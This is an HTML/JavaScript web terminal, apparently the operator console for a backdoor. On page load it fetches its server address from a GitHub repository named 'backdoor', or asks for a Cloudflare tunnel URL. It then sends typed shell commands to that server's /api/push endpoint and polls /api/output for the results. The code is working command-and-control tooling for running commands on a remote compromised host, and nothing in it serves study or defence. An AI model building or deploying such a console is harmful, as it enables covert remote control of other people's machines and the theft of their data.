<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NetShell Web Terminal</title>
    <!-- Include Xterm.js CSS and Fit Addon CSS CDN -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" />
    <style>
        body {
            background-color: #121212;
            color: #f0f0f0;
            font-family: Menlo, Monaco, "Courier New", Courier, monospace;
            margin: 0;
            padding: 10px;
            display: flex;
            flex-direction: column;
            height: 100vh;
            box-sizing: border-box;
            overflow: hidden;
        }
        /* Top Right Font Controls */
        .controls {
            position: fixed;
            top: 10px;
            right: 15px;
            z-index: 1000;
            background: rgba(30, 30, 30, 0.85);
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid #333;
            backdrop-filter: blur(4px);
        }
        .controls button {
            background: #2d2d2d;
            color: #fff;
            border: 1px solid #444;
            padding: 2px 8px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 3px;
            font-size: 13px;
        }
        .controls button:hover {
            background: #3c3c3c;
        }
        .controls span {
            margin: 0 4px;
            font-size: 11px;
            color: #888;
        }
        #status-bar {
            margin-bottom: 6px;
            font-size: 12px;
            color: #888;
        }
        #terminal-container {
            flex-grow: 1;
            background-color: #000000;
            border: 1px solid #2b2b2b;
            border-radius: 6px;
            padding: 8px;
            overflow: hidden;
        }
    </style>
</head>
<body>

    <!-- Top Right Font Controls -->
    <div class="controls">
        <span>Font</span>
        <button onclick="adjustFontSize(-1)">-</button>
        <button onclick="adjustFontSize(1)">+</button>
    </div>

    <div id="status-bar">Initializing NetShell Bridge...</div>
    
    <!-- Fullscreen Xterm Viewport Wrapper -->
    <div id="terminal-container"></div>

    <!-- Include Xterm.js Core & Fit Addon CDNs -->
    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
    <script>
        const GIST_URL = "https://raw.githubusercontent.com/Yehia213/backdoor/main/api.txt";
        let BASE_URL = "";
        
        const statusBar = document.getElementById('status-bar');

        // Initialize genuine Xterm instance & FitAddon
        const term = new Terminal({
            cursorBlink: true,
            theme: {
                background: '#000000',
                foreground: '#f0f0f0',
                cursor: '#4ec9b0',
                selectionBackground: 'rgba(78, 201, 176, 0.3)'
            },
            fontSize: 14,
            fontFamily: 'Menlo, Monaco, "Courier New", Courier, monospace'
        });

        const fitAddon = new FitAddon.FitAddon();
        term.loadAddon(fitAddon);

        term.open(document.getElementById('terminal-container'));
        fitAddon.fit();

        // Handle auto-resizing on window size changes
        window.addEventListener('resize', () => {
            fitAddon.fit();
        });

        let currentFontSize = 14;
        function adjustFontSize(delta) {
            currentFontSize += delta;
            if (currentFontSize < 10) currentFontSize = 10;
            if (currentFontSize > 28) currentFontSize = 28;
            term.options.fontSize = currentFontSize;
            fitAddon.fit();
        }

        async function initServerConnection() {
            statusBar.textContent = "Fetching active server link from GitHub...";
            try {
                let response = await fetch(GIST_URL);
                if (response.ok) {
                    let text = await response.text();
                    BASE_URL = text.trim().replace(/\/$/, '');
                    if (BASE_URL.startsWith('http')) {
                        statusBar.textContent = `Connected to: ${BASE_URL}`;
                        term.writeln("\x1b[32m[+] Successfully linked via GitHub api.txt\x1b[0m");
                        startInteractiveShell();
                        startPollingOutput();
                        return;
                    }
                }
            } catch (e) {
                console.warn("Auto-fetch from GitHub failed:", e);
            }

            // Fallback: ask user via prompt if auto-fetch fails
            let manualUrl = prompt("Failed to auto-fetch server URL from GitHub. Please enter your active Cloudflare tunnel URL:");
            if (manualUrl && manualUrl.trim().startsWith('http')) {
                BASE_URL = manualUrl.trim().replace(/\/$/, '');
                statusBar.textContent = `Connected manually to: ${BASE_URL}`;
                term.writeln("\x1b[32m[+] Connected via manual input\x1b[0m");
                startInteractiveShell();
                startPollingOutput();
            } else {
                statusBar.textContent = "Error: No valid server URL provided.";
                term.writeln("\x1b[31m[!] Connection aborted. Refresh to try again.\x1b[0m");
            }
        }

        // Setup Fully Interactive Xterm Input Handling
        let currentLine = "";
        function startInteractiveShell() {
            promptUser();

            term.onData(async (data) => {
                if (!BASE_URL) return;
                
                const charCode = data.charCodeAt(0);

                if (charCode === 13) { // Enter key
                    term.writeln('');
                    let cmd = currentLine.trim();
                    currentLine = "";

                    if (cmd.length > 0) {
                        try {
                            await fetch(`${BASE_URL}/api/push`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ command: cmd })
                            });
                        } catch (err) {
                            term.writeln(`\x1b[31m[!] Error pushing command to server.\x1b[0m`);
                            promptUser();
                        }
                    } else {
                        promptUser();
                    }
                } else if (charCode === 127) { // Backspace
                    if (currentLine.length > 0) {
                        currentLine = currentLine.slice(0, -1);
                        term.write('\b \b');
                    }
                } else if (charCode >= 32) { // Printable characters
                    currentLine += data;
                    term.write(data);
                }
            });
        }

        function promptUser() {
            term.write('\x1b[36m$ \x1b[0m');
        }

        let lastHandledOutput = "";
        // Poll for command outputs from the server
        function startPollingOutput() {
            setInterval(async () => {
                if (!BASE_URL) return;
                try {
                    let res = await fetch(`${BASE_URL}/api/output`);
                    if (res.ok) {
                        let data = await res.json();
                        if (data.result && data.result !== lastHandledOutput) {
                            lastHandledOutput = data.result;
                            
                            // Clear current typed line buffer momentarily to print command results cleanly
                            term.write('\r\x1b[K'); 
                            let formattedOutput = data.result.replace(/\n/g, '\r\n');
                            term.writeln(formattedOutput);
                            promptUser();
                            if (currentLine) term.write(currentLine);
                        }
                    }
                } catch (e) {
                    // Silent polling error retry
                }
            }, 1500);
        }

        // Run initialization on page load
        initServerConnection();
    </script>
</body>
</html>
